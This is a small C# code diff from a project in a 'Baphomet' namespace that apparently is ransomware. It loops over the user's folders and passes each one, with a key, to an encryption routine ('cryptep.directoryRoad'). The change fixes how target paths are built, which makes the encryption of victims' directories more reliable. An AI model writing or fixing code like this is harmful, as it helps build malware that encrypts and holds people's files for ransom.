@@ -34,7 +34,7 @@ namespace Baphomet
             diag.CheckProccess();
             for (int d = 0; d < pathDirs.Length; d++)//recorro cada uno de los dirs validos
             {
-                var targetPath = userDir + pathDirs[d];
+                var targetPath = Path.Combine(userDir,pathDirs[d]);
                 cryptep.directoryRoad(targetPath, key);
             }
 
